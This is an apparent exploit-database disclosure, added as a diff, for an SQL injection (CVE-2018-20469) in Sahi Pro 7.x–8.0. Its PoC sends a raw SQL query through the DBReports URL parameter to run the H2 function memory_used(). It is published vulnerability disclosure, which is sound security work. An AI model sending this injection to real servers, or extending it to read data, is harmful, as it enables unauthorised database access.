@@ -1,0 +1,25 @@
+# Exploit Title: Sahi pro ( <= 8.x ) sensitive information disclosure by SQL injection.
+# Date: 17-06-2019
+# Exploit Author: Goutham Madhwaraj ( https://barriersec.com )
+# Vendor Homepage: https://sahipro.com/
+# Software Link: https://sahipro.com/downloads-archive/
+# Version: 7.x , <= 8.x
+# Tested on: Windows 10
+# CVE : CVE-2018-20469
+# POC-URL : https://barriersec.com/2019/06/cve-2018-20469-sahi-pro/
+
+Description :
+
+An issue was discovered in Tyto Sahi Pro through 7.x.x and 8.0.0. A parameter in the web reports module is vulnerable to SQL injection. This can be exploited to inject SQL queries and run standard h2 system functions.
+
+
+POC :
+
+vulnerable URL :
+
+''' replace the ip and port of the remote sahi pro server machine '''
+
+
+# here sql query is passed directly as part of GET request which can be modified to run standard h2 database functions. in the following POC , "memory_used()" function is injected , which is reflected in "status" column of reports page.
+
+http://<ip>:<port>/_s_/dyn/pro/DBReports?sql=SELECT DISTINCT memory_used() AS ROWSTATUS, SCRIPTREPORTS.SCRIPTREPORTID,SCRIPTREPORTS.SCRIPTNAME,SUITEREPORTS.* FROM SUITEREPORTS,SCRIPTREPORTS
